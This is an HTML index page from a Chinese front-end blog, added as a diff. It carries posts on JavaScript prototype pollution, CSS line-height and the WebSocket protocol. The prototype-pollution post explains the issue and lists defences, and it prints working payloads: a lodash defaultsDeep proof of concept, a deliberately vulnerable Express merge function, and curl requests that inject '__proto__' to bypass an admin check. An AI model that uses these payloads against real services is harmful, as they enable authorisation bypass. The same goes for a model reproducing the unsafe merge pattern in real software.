@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="forever young">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    
+    xqyoung&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+<main class="content">
+  <section class="jumbotron">
+  <div class="video">
+    
+      <div class="video-frame">
+        <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
+      </div>
+    
+    <div class="video-media">
+      <video playsinline="" autoplay loop muted data-autoplay="" poster="/images/ocean/ocean.png" x5-video-player-type="h5">
+        <source src="/images/ocean/ocean.mp4" type="video/mp4">
+        <source src="/images/ocean/ocean.ogv" type="video/ogg">
+        <source src="/images/ocean/ocean.webm" type="video/webm">
+        <p>Your user agent does not support the HTML5 Video element.</p>
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+    <div class="video-inner text-center text-white">
+      <h1><a href="/">xqyoung&#39;s blog</a></h1>
+      <p>前端点滴积累</p>
+      <div><img src="/images/hexo-inverted.svg" class="brand" alt="xqyoung&#39;s blog"></div>
+    </div>
+    <div class="video-learn-more">
+      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
+    </div>
+  </div>
+</section>
+
+<div id="landingpage">
+  <section class="outer">
+    <article class="articles">
+      
+      <h1 class="page-type-title"></h1>
+      
+        
+          <article id="post-js-prototype-pollution" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/07/21/js-prototype-pollution/">js-prototype-pollution</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/07/21/js-prototype-pollution/" class="article-date">
+  <time datetime="2019-07-21T14:59:04.000Z" itemprop="datePublished">2019-07-21</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/js-基础/">js 基础</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <blockquote>
+<p>长草的 github 某一天突然往邮箱狂发了几个 vulnerable dependency 的提醒，才知 lodash 爆漏洞了。该漏洞是个原型污染问题，由开源安全平台 Snyk 的开发者 Liran Tal发现，详情看[这里]。</p>
+</blockquote>
+<h3 id="lodash-漏洞"><a href="#lodash-漏洞" class="headerlink" title="lodash 漏洞"></a>lodash 漏洞</h3><p>lodash 有个 defaultsDeep 方法，也就是默认的深拷贝方法，它能够实现这样的功能：</p>
+<blockquote>
+<p>分配来源对象（该方法的第二个参数）的可枚举属性到目标对象（该方法的第一个参数）所有解析为 undefined 的属性上</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_.defaultsDeep(&#123; <span class="string">'a'</span>: &#123; <span class="string">'b'</span>: <span class="number">2</span> &#125; &#125;, &#123; <span class="string">'a'</span>: &#123; <span class="string">'b'</span>: <span class="number">1</span>, <span class="string">'c'</span>: <span class="number">3</span> &#125; &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">'a'</span>: &#123; <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span> &#125; &#125;</span><br></pre></td></tr></table></figure>
+<p>在第二个参数上动些手脚，可以修改对象原型链上的属性：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
+<p>这里在空对象 <code>{}</code> 上加了一个 <code>a0</code> 熟悉。既然能增加，那么修改也不是问题了，如果修改 <code>toString</code> 原型方法，例如把 <code>payload</code> 换成</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"toString": true&#125;&#125;&#125;'</span></span><br></pre></td></tr></table></figure>
+<p>那么 <code>Object.prototype.toString</code> 就很不安全了。</p>
+<p>lodash 紧急发布的修复中，对第二个拷贝参数作了键值判断</p>
+<p><img src="https://res.cloudinary.com/snyk/image/upload/v1562272212/Screen_Shot_2019-07-04_at_23.29.28.png" alt=""></p>
+<p><img src="https://res.cloudinary.com/snyk/image/upload/v1562272212/Screen_Shot_2019-07-04_at_23.29.28.png" alt=""></p>
+<h3 id="NodeJS-漏洞案例"><a href="#NodeJS-漏洞案例" class="headerlink" title="NodeJS 漏洞案例"></a>NodeJS 漏洞案例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Constants</span></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">8080</span>;</span><br><span class="line"><span class="keyword">const</span> HOST = <span class="string">'0.0.0.0'</span>;</span><br><span class="line"><span class="keyword">const</span> admin = &#123;&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// App</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"> </span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(path.join(__dirname, <span class="string">'views'</span>)));</span><br><span class="line">app.post(<span class="string">'/signup'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">    <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">    <span class="keyword">if</span> (copybody.name) &#123;</span><br><span class="line">        res.cookie(<span class="string">'name'</span>, copybody.name).json(&#123;</span><br><span class="line">            <span class="string">"done"</span>: <span class="string">"cookie set"</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            <span class="string">"error"</span>: <span class="string">"cookie not set"</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/getFlag'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> аdmin = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.cookies))</span><br><span class="line">    <span class="keyword">if</span> (admin.аdmin == <span class="number">1</span>) &#123;</span><br><span class="line">        res.send(<span class="string">"hackim19&#123;&#125;"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"You are not authorized"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(PORT, HOST);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Running on http://<span class="subst">$&#123;HOST&#125;</span>:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
+<p>问题出在 <code>merge</code> 函数上，攻击者可以通过以下方式绕过登陆验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -vv --header &apos;Content-type: application/json&apos; -d &apos;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&apos; &apos;http://0.0.0.0:4000/signup&apos;; </span><br><span class="line"></span><br><span class="line">curl -vv &apos;http://0.0.0.0:4000/getFlag&apos;</span><br></pre></td></tr></table></figure>
+<p>攻击案例来自：<a href="https://www.youtube.com/watch?v=LUsiFV3dsK8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LUsiFV3dsK8</a></p>
+<p>像接口数据的校验，就要小心原型被修改的可能。</p>
+<h3 id="原型污染防范"><a href="#原型污染防范" class="headerlink" title="原型污染防范"></a>原型污染防范</h3><ul>
+<li>使用 <code>Object.freeze()</code></li>
+<li>使用 <code>Object.create(null)</code> </li>
+</ul>
+<blockquote>
+<p>参考<br>(Snyk research team discovers severe prototype pollution security vulnerabilities affecting all versions of lodash)[<a href="https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/]" target="_blank" rel="noopener">https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/]</a></p>
+<p>部分转载自<a href="https://juejin.im/post/5d271332f265da1b934e2d48#heading-2" target="_blank" rel="noopener">最新：Lodash 严重安全漏洞背后你不得不知道的 JavaScript 知识</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2019/07/21/js-prototype-pollution/" data-id="ckbs697ps000urhjcz3k5v8td" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-line-height" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/01/05/line-height/">css line-height &amp; vertical-align</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/01/05/line-height/" class="article-date">
+  <time datetime="2019-01-05T21:48:19.000Z" itemprop="datePublished">2019-01-05</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/css-基础/">css 基础</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>写样式到时候经常遇到单行文字垂直居中，对于高度已知的块级元素，我们知道一种简单写法：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">line-height</span>: 30<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">height</span>: 30<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure>
+<p>设定行高，到底改变了什么？</p>
+<h3 id="字体的度量"><a href="#字体的度量" class="headerlink" title="字体的度量"></a>字体的度量</h3><p>先从英文字母开始。刚开始学ABCD的时候，我们都知道练习本上面有四条线。</p>
+<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Typography_Line_Terms.svg/410px-Typography_Line_Terms.svg.png" alt=""></p>
+<p>我们知道一些字母，比如小写的 a、e，是完全写在中间两条线之间的。写大写字母的时候，比如 A，B，它们的最顶部不会顶到第一条线，那样就很难看了——老师一般是这么说的，但是实际上，AB这样的大写字母，本身就不“顶天”。</p>
+<p>这里我们先明确两个概念：</p>
+<ul>
+<li><code>Capital Height</code> 大写字母高度</li>
+<li><code>x-height</code> 字母 x 的高度</li>
+</ul>
+<p>字体的高度和具体字符的高度不是一个概念，英文练习本上面，英文字符大多有上下留白。</p>
+<p>现在又有一个问题，字体的高度是怎么算的？我们平时用 px 去设定 font-size ，对不同字体的结果一样吗？</p>
+<hr>
+<p>传统金属字块，我们可以看到一个字符是摆在一个方格里面的。同种字体，所有字符的方格是一样的，不同字体的区别在于方格的大小，以及字符在方格中上下“留白”大小。</p>
+<p><img src="https://designwithfontforge.com/en-US/images/MetalTypeZoomIn.JPG" alt=""></p>
+<p>我们来看字体的度量</p>
+<ul>
+<li><p>字体定义其 <a href="https://designwithfontforge.com/en-US/The_EM_Square.html" target="_blank" rel="noopener">em square</a>，也称为 “em size” 或 “UPM” ，是字符所处的容器。对于 OpenType 字体，这个值通常是 1000 ；对于 TrueType 字体，这个值是 2 的指数，通常设定为 1024 或 2048 。</p>
+</li>
+<li><p>字体块对外高度由 ascender、descender 和 line gap决定。</p>
+</li>
+<li>具体字符由 capital height、x-height 决定</li>
+</ul>
+<p>以 Arial 字体为例，以下是它的参数。</p>
+<p><img src="font.jpg" alt=""></p>
+<p>设定 <code>font-size: 100px</code> ，<code>&lt;p&gt;&lt;/p&gt;</code>块最终高度是多少？</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>skdjdAfd<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="outcome.png" alt=""></p>
+<p>结果是 115px ，也就是说 Arial 字体 line-height normal 值为 1.15。计算为 <code>(ascent + descent + line gap)/em-square</code> ，line gap（线间距）不是所有字体都有。</p>
+<p>ascent+descent区域，我们称为内容区域（content-area）</p>
+<p>没有人为设定字体行高的时候，content-area + line-gap（有些字体为 0 ） 为 line-height。</p>
+<p>到这里可以确定，开篇提到的那种居中方法，居中的其实是 content-area 。</p>
+<h3 id="line-box"><a href="#line-box" class="headerlink" title="line-box"></a>line-box</h3><p>当 <code>&lt;p&gt;</code> 元素呈现在屏幕上，它根据它的宽度可以有很多线。每一行是由一个或多个行内元素（HTML标签元素或匿名内联元素文本内容）组成，专业术语称为行盒（line-box）。line-box的高度是基于它的子元素高度的。浏览器为每个行内元素计算的高度都是line-box（子元素的最高点到最低点）。因此line-box的总高度足以包含所有子元素（默认情况下）。</p>
+<h3 id="line-height-的值"><a href="#line-height-的值" class="headerlink" title="line-height 的值"></a>line-height 的值</h3><p>line-height normal 的值，依据不同字体去计算，如果是数字或百分比，相对字体的大小计算。改变 line-height 可能是一件危险的事，所有字体都有自己的安全行高，如果 line-height 过小，字符可能超出 line-box 。</p>
+<p><img src="chop.jpg" alt=""></p>
+<blockquote>
+<p>参考<br><a href="https://www.w3cplus.com/css/css-font-metrics-line-height-and-vertical-align.html" target="_blank" rel="noopener">深入了解CSS字体度量，行高和vertical-align</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2019/01/05/line-height/" data-id="ckbs697pr000srhjcwelw6mlg" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/css/">css</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-websocket-beginner" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/25/websocket-beginner/">初识 WebSocket</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/25/websocket-beginner/" class="article-date">
+  <time datetime="2018-11-25T15:03:25.000Z" itemprop="datePublished">2018-11-25</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络/">网络</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>WebSocket 是一种协议，<a href="https://tools.ietf.org/html/rfc6455" target="_blank" rel="noopener">RFC 6455</a> 指出了它的目的：为基于浏览器的应用提供一种机制，使得应用可以在不依赖多条 HTTP 链接的情况（使用 XMLHttpRequest ，iframe 或长轮询）下与服务器进行通信。</p>
+<h3 id="WebSocket-链接过程"><a href="#WebSocket-链接过程" class="headerlink" title="WebSocket 链接过程"></a>WebSocket 链接过程</h3><p>接下来用一个简单的例子，了解 WebSocket 链接的建立和通信过程。</p>
+<p>Server 端：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> wss = <span class="keyword">new</span> WebSocket.Server(&#123; <span class="attr">port</span>: <span class="number">8080</span> &#125;);</span><br><span class="line"> </span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> <span class="title">connection</span>(<span class="params">ws</span>) </span>&#123;</span><br><span class="line">  ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> <span class="title">incoming</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'received: %s'</span>, message);</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">  ws.send(<span class="string">'something'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>Client 端：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">'ws://localhost:8080'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connection opened</span></span><br><span class="line">socket.addEventListener(<span class="string">'open'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  socket.send(<span class="string">'Hello Server!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Listen for messages</span></span><br><span class="line">socket.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Message from server '</span>, event.data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h4 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h4><p>WebSocket 本质上还是基于 TCP 协议，所以 WebSocket client 和 server 通信的第一步，依然是建立 TCP 链接。这一点和 HTTP 协议的表现差不多。</p>
+<h4 id="协议升级"><a href="#协议升级" class="headerlink" title="协议升级"></a>协议升级</h4><p>WebSocket 建立链接的握手过程，是要适配基于 HTTP 的服务端软件和中间件的，所以一个端口，可以同时允许一个 HTTP 客户端和一个服务器通信，或者一个 WebSocket 客户端和这个服务器通信。</p>
+<p><img src="websocket-client.png" alt=""></p>
+<p>TCP 建立后，客户端发起协议升级请求，下面是请求头部的部分信息。WebSocket 要求 HTTP 版本至少为 1.1 ，并且只支持 GET 请求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET ws://localhost:8080/ HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Origin: http://localhost:3000</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Key: 8NgftYvA8Vyr7cGRS8WdpA==</span><br><span class="line">Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Upgrade 字段，值为 <code>websocket</code> ，表示要升级到 WebSocket 协议。</li>
+<li>Sec-WebSocket-Version 字段，表示 WebSocket 的版本。如果服务端不支持该版本，需要返回一个 <code>Sec-WebSocket-Version</code> header ，里面包含服务端支持的版本号。</li>
+<li>Sec-WebSocket-Key 字段，与后面服务端响应首部的 Sec-WebSocket-Accept 是配套的，用于告知客户端，服务器愿意初始化 WebSocket 链接。</li>
+<li>Sec-WebSocket-Extensions 可选字段，表示协议级别上（可能为空）服务器可以使用的扩展。</li>
+</ul>
+<p>服务端同意协议升级：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: JAz1fxUy5f9LbUgeVcToNl0yWzA=</span><br></pre></td></tr></table></figure>
+<h4 id="Sec-WebSocket-Accept-的计算"><a href="#Sec-WebSocket-Accept-的计算" class="headerlink" title="Sec-WebSocket-Accept 的计算"></a>Sec-WebSocket-Accept 的计算</h4><ol>
+<li>将客户端的 <code>Sec-WebSocket-Key</code> 跟 <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code> 拼接。</li>
+<li>计算拼接值的 SHA1 哈希值，转换为 Base64 编码。</li>
+</ol>
+<p><code>Sec-WebSocket-Key</code> 和 <code>Sec-WebSocket-Accept</code> 这一对配套的头部信息有什么用呢？<a href="https://tools.ietf.org/html/rfc6455#page-7" target="_blank" rel="noopener">RFC 6455</a> 是这样解释的：服务端要给客户端一个准信，它已经收到服务端的 WebSocket 握手请求了，针对这个客户端，服务端不接受非 WebSocket 链接，这样可以防止攻击者通过 XMLHttpRequest 或表单提交向 WebSocket 服务器发送伪装过的包。</p>
+<h4 id="数据帧格式"><a href="#数据帧格式" class="headerlink" title="数据帧格式"></a>数据帧格式</h4><p>WebSocket 客户端、服务端通信的最小单位是帧（frame），由 1 个或多个帧组成一条完整的消息（message）。</p>
+<p>发送端：将消息切割成多个帧，并发送给服务端；</p>
+<p>接收端：接收消息帧，并将关联的帧重新组装成完整的消息；</p>
+<h5 id="帧格式详解"><a href="#帧格式详解" class="headerlink" title="帧格式详解"></a>帧格式详解</h5><p>参考 <a href="https://tools.ietf.org/html/rfc6455#section-5.2" target="_blank" rel="noopener">RFC 6455 5.2</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|F|R|R|R| opcode|M| Payload len |    Extended payload length    |</span><br><span class="line">|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |</span><br><span class="line">|N|V|V|V|       |S|             |   (if payload len==126/127)   |</span><br><span class="line">| |1|2|3|       |K|             |                               |</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|     Extended payload length continued, if payload len == 127  |</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|                               |Masking-key, if MASK set to 1  |</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">| Masking-key (continued)       |          Payload Data         |</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|                     Payload Data continued ...                |</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p><strong>FIN</strong> ，1 比特</p>
+<p>指示这个帧是不是消息的最后一个分片（fragment）。1 表示是，0 表示否。</p>
+<p><strong>RSV1，RSV2，RSV3</strong> ，3 比特</p>
+<p>这个是跟 WebSocket 扩展有关的，全 0 表示没有使用任何扩展。</p>
+<p><strong>Opcode</strong> ，4 比特</p>
+<p>定义了对载荷数据（Payload Data）的解析。它有以下值：</p>
+<ul>
+<li><p><code>%x0</code> 表示一个延续帧，本次数据传输采用了数据分片，当前收到的数据帧为其中一个数据分片。</p>
+</li>
+<li><p><code>%x1</code> 表示一个文本帧</p>
+</li>
+<li><p><code>%x2</code> 表示一个二进制帧</p>
+</li>
+<li><p><code>%x3-7</code> 预保留</p>
+</li>
+<li><p><code>%x8</code> 表示链接关闭</p>
+</li>
+<li><p><code>%x9</code> 表示一个 ping 操作</p>
+</li>
+<li><p><code>%xA</code> 表示一个 pong 操作</p>
+</li>
+<li><p><code>%xB-F</code> 预保留</p>
+</li>
+</ul>
+<p><strong>Mask</strong> ，1 比特</p>
+<p>表示是否要对数据载荷进行掩码操作。从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。</p>
+<p>如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。</p>
